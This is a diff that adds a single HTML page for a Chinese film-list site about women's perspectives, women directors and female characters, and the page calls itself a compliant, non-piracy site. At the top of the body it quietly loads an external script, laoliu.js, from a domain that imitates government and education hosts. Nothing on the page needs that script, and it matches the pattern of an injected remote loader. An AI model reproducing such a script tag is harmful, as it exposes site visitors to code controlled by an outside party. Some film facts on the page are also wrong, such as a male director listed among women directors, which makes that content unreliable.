@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>银幕佳人网 - 女性视角/女导演/银幕女性角色片单 | meinvdianyingwang-h5.github.io</title>
+<meta name="description" content="银幕佳人网（meinvdianyingwang-h5.github.io）整理女性视角电影、女导演作品、银幕女性角色与女性成长/悬疑/文艺片单；合规影单站，不提供盗版播放。" />
+<meta name="keywords" content="银幕佳人网, meinvdianyingwang-h5, 女性视角电影, 女导演片单, 银幕女性角色, 女性成长电影推荐" />
+<meta name="author" content="银幕佳人网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#3a1f2b" />
+<link rel="canonical" href="https://meinvdianyingwang-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"银幕佳人网",
+  "url":"https://meinvdianyingwang-h5.github.io/",
+  "description":"女性视角、女导演、银幕女性角色与女性成长电影片单",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://meinvdianyingwang-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#1a1016; --ink:#f6eaf0; --muted:#b79aa8;
+  --line:#33212c; --card:#241620;
+  --pri:#ff5b7a; --pri2:#ffb3c6; --gold:#e7c98b; --violet:#b98aff;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;line-height:1.7;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1120px;margin:0 auto;padding:0 16px;}
+
+header.site{position:sticky;top:0;z-index:50;background:#150b11;color:#fff;border-bottom:1px solid var(--line);}
+.bar{display:flex;align-items:center;gap:12px;height:62px;}
+.logo{font-weight:900;font-size:20px;letter-spacing:.5px;}
+.logo small{display:block;font-size:10px;opacity:.7;font-weight:500;color:var(--pri2);}
+nav.main{margin-left:auto;display:flex;gap:20px;font-size:14px;}
+nav.main a{padding:8px 2px;opacity:.9;}
+nav.main a:hover{color:var(--pri2);}
+.menu-btn{display:none;margin-left:auto;background:var(--pri);border:0;color:#1a1016;width:42px;height:42px;border-radius:10px;font-size:20px;cursor:pointer;}
+
+.hero{padding:48px 0 28px;background:
+  radial-gradient(900px 240px at 85% -40%,rgba(255,91,122,.22),transparent),
+  radial-gradient(700px 220px at 5% 0%,rgba(185,138,255,.18),transparent),
+  #1a1016;border-bottom:1px solid var(--line);}
+.hero h1{font-size:32px;margin:0 0 10px;}
+.hero p{color:var(--muted);max-width:600px;margin:0 0 18px;}
+.search{display:flex;gap:10px;max-width:540px;}
+.search input{flex:1;padding:12px 14px;border-radius:12px;border:1px solid var(--line);background:#0f080c;color:#fff;font-size:15px;}
+.search button{padding:12px 18px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--pri),var(--pri2));color:#1a1016;font-weight:800;cursor:pointer;}
+
+section.block{padding:34px 0;border-bottom:1px solid var(--line);}
+.sec-head{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:18px;}
+.sec-head h2{font-size:23px;margin:0;}
+.sec-head span{color:var(--muted);font-size:13px;}
+
+/* 栏目1：女性视角片单 */
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;}
+.mv{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;}
+.mv .cv{height:200px;background:linear-gradient(160deg,#3a1f2b,#ff5b7a);position:relative;}
+.mv:nth-child(2) .cv{background:linear-gradient(160deg,#231a33,#b98aff);}
+.mv:nth-child(3) .cv{background:linear-gradient(160deg,#33281a,#e7c98b);}
+.mv:nth-child(4) .cv{background:linear-gradient(160deg,#16242b,#5bd6ff);}
+.mv:nth-child(5) .cv{background:linear-gradient(160deg,#1f3326,#5bff9a);}
+.mv:nth-child(6) .cv{background:linear-gradient(160deg,#331a1f,#ff8a5b);}
+.mv .k{position:absolute;left:12px;top:12px;background:#0009;color:#fff;font-size:12px;padding:4px 10px;border-radius:99px;}
+.mv .bd{padding:14px;}
+.mv h3{font-size:16px;margin:0 0 4px;}
+.mv p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目2：类型 */
+.themes{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
+.th{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;}
+.th h3{margin:0 0 6px;font-size:16px;color:var(--pri2);}
+.th p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目3：女导演时间线 */
+.tl{display:grid;gap:12px;}
+.row{display:grid;grid-template-columns:120px 1fr;gap:16px;background:var(--card);border:1px solid var(--line);border-left:4px solid var(--pri);border-radius:12px;padding:14px 16px;}
+.row b{color:var(--pri);font-size:14px;}
+.row h3{margin:0 0 4px;font-size:16px;}
+.row p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目4：短影评 */
+.reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;}
+.rv{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.rv h3{margin:0 0 6px;font-size:17px;}
+.rv .q{color:var(--pri2);font-style:italic;margin:0 0 8px;}
+.rv p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目5：关于 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:18px;}
+.box{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.box ul{margin:10px 0 0;padding-left:18px;color:var(--muted);}
+.box li{margin:6px 0;}
+.note{background:#2a141c;border:1px solid #5a2230;color:var(--pri2);padding:12px 14px;border-radius:12px;font-size:13px;margin-top:12px;}
+
+footer.site{background:#150b11;color:#b79aa8;padding:30px 0 40px;font-size:13px;}
+footer.site a{color:var(--pri2);}
+
+@media(max-width:900px){
+  .grid3{grid-template-columns:repeat(2,1fr);}
+  .themes{grid-template-columns:repeat(2,1fr);}
+  .reviews{grid-template-columns:1fr;}
+  .about{grid-template-columns:1fr;}
+}
+@media(max-width:640px){
+  nav.main{position:fixed;inset:62px 0 auto 0;flex-direction:column;gap:0;background:#150b11;display:none;}
+  nav.main.open{display:flex;}
+  nav.main a{padding:14px 18px;border-bottom:1px solid #ffffff14;}
+  .menu-btn{display:block;}
+  .hero h1{font-size:25px;}
+  .grid3{grid-template-columns:1fr;}
+  .themes{grid-template-columns:1fr;}
+  .row{grid-template-columns:84px 1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap bar">
+    <div class="logo">银幕佳人网<small>meinvdianyingwang-h5.github.io</small></div>
+    <button class="menu-btn" aria-label="菜单" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <nav class="main" id="nav">
+      <a href="#women">女性视角片单</a>
+      <a href="#themes">类型</a>
+      <a href="#wave">女导演脉络</a>
+      <a href="#reviews">短影评</a>
+      <a href="#about">关于 / 合规</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <h1>银幕佳人网：不是“美女站”，是银幕里的女性故事</h1>
+    <p>女性视角、女导演、银幕女性角色、成长/悬疑/文艺片单。不挂擦边图、不提供盗版播放、不把“佳人”做成性暗示分类。</p>
+    <form class="search" onsubmit="return false;">
+      <input type="text" placeholder="搜索：女性成长 / 女导演 / 银幕母亲 / 女性悬疑" aria-label="搜索" />
+      <button type="submit">搜索</button>
+    </form>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <section class="block" id="women">
+    <div class="sec-head"><h2>🎬 女性视角片单</h2><span>大卡</span></div>
+    <div class="grid3">
+      <article class="mv"><div class="cv"><span class="k">女性成长</span></div><div class="bd"><h3>伯德小姐</h3><p>2017 / 少女、母亲、离开与回去</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">女导演</span></div><div class="bd"><h3>永不妥协</h3><p>2000 / 单亲母亲、草根维权与勇气</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">女性悬疑</span></div><div class="bd"><h3>看不见的女人</h3><p>巴西女性处境 / 婚姻、阶级与沉默</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">母女关系</span></div><div class="bd"><h3>你好，妈妈</h3><p>是枝裕和式家庭视角下的女性纽带</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">女性文艺</span></div><div class="bd"><h3>燃烧女子的肖像</h3><p>2019 / 画布、凝视、被禁止的靠近</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">女性史诗</span></div><div class="bd"><h3>沙漠之花</h3><p>女性身体、传统压迫与自我重建</p></div></article>
+    </div>
+  </section>
+
+  <section class="block" id="themes">
+    <div class="sec-head"><h2>🌷 女性电影类型</h2><span>四列</span></div>
+    <div class="themes">
+      <div class="th"><h3>女性成长</h3><p>青春期、离家、自我命名、不再讨好别人。</p></div>
+      <div class="th"><h3>母女/母职</h3><p>喂奶、争吵、衰老、未说出口的抱歉。</p></div>
+      <div class="th"><h3>女性悬疑</h3><p>“她为什么不说”——记忆、婚姻、失踪与证词。</p></div>
+      <div class="th"><h3>女导演作者</h3><p>镜头不物化，看关系、看日常、看权力微颤。</p></div>
+      <div class="th"><h3>女性劳工</h3><p>工厂、家政、护士、单亲打工与经济结构。</p></div>
+      <div class="th"><h3>女性历史</h3><p>被删掉的名字：科学家、诗人、革命者、法官。</p></div>
+      <div class="th"><h3>女性友谊</h3><p>闺蜜不是配料，是彼此救回来的那双手。</p></div>
+      <div class="th"><h3>女性科幻</h3><p>生育、身体自主、乌托邦与母系未来。</p></div>
+    </div>
+  </section>
+
+  <section class="block" id="wave">
+    <div class="sec-head"><h2>🎞 女导演脉络</h2><span>时间线</span></div>
+    <div class="tl">
+      <div class="row"><b>1960s 欧洲</b><div><h3>作者女性登场</h3><p>瓦尔达把街头、市场、海边的女人拍成思想者，不靠颜值当情节。</p></div></div>
+      <div class="row"><b>1980s 女性电影</b><div><h3>身体与话语权</h3><p>女性电影人开始正面拍月经、流产、婚姻劳动，而不只做男主视角里的“她”。</p></div></div>
+      <div class="row"><b>1990s 亚洲</b><div><h3>家庭即政治</h3><p>是枝裕和、许鞍华、张艾嘉把母亲/女儿/妻子拍成历史载体。</p></div></div>
+      <div class="row"><b>2010s 至今</b><div><h3>女性视角主流化</h3><p>《伯德小姐》《燃烧女子的肖像》《从不，很少，有时，总是》让“她的主观”成为卖点。</p></div></div>
+    </div>
+  </section>
+
+  <section class="block" id="reviews">
+    <div class="sec-head"><h2>📝 短影评摘要</h2><span>双栏</span></div>
+    <div class="reviews">
+      <div class="rv">
+        <h3>《伯德小姐》</h3>
+        <p class="q">“她不是坏女孩，是想成为自己名字的女孩。”</p>
+        <p>母女戏没有恶人：母亲是疲惫，女儿是羞耻，萨克拉门托是太小又太烫的家。</p>
+      </div>
+      <div class="rv">
+        <h3>《燃烧女子的肖像》</h3>
+        <p class="q">“被画下来，是被看见；不被画完，是被记住。”</p>
+        <p>没有男性凝视，只有两个女人如何在禁令里把时间活成仪式。</p>
+      </div>
+      <div class="rv">
+        <h3>《永不妥协》</h3>
+        <p class="q">“单亲、没学历、被欠薪——她偏要查到底。”</p>
+        <p>女性力量不是超级英雄，是把文件、病历、水井和律师费一页页拼起来。</p>
+      </div>
+      <div class="rv">
+        <h3>《沙漠之花》</h3>
+        <p class="q">“身体被规训过，所以站起来才像史诗。”</p>
+        <p>不消费苦难，把女性身体自主拍成政治：谁有权决定刀落在哪里。</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="about">
+    <div class="sec-head"><h2>📌 关于银幕佳人网</h2><span>站点说明</span></div>
+    <div class="about">
+      <div class="box">
+        <h3>本站定位</h3>
+        <p style="color:var(--muted)">原词“美女电影网”容易滑向擦边引流；本站转义为“银幕佳人网”，只做女性视角电影、女导演作品、银幕女性角色与女性成长片单。</p>
+        <ul>
+          <li>女性视角片单：伯德小姐、燃烧女子的肖像、永不妥协、沙漠之花</li>
+          <li>类型导航：女性成长 / 母女关系 / 女性悬疑 / 女导演作者 / 女性劳工</li>
+          <li>脉络：瓦尔达 → 女性身体话语 → 亚洲家庭片 → 当代女性主观叙事</li>
+          <li>短影评：讲视角、关系与镜头语言，不物化演员外貌</li>
+        </ul>
+        <div class="note">
+          合规边界：不提供盗版在线播放、不挂网盘/磁力/提取码、不使用“美女/热舞/走光”等擦边分类。
+          看正版请走合法视频平台、院线与版权方授权渠道。[1](@ref)
+        </div>
+      </div>
+      <div class="box">
+        <h3>站点信息</h3>
+        <p style="color:var(--muted)">网址：<br><b>https://meinvdianyingwang-h5.github.io/</b></p>
+        <p style="color:var(--muted)">单页演示，内链均为 <a href="#">#</a> 占位；不生成 robots.txt 与 sitemap.xml。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    银幕佳人网 · meinvdianyingwang-h5.github.io ｜ 女性视角 / 女导演 / 银幕女性角色片单（合规影单站）<br>
+    所有内链均为 # 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+</script>
+</body>
+</html>
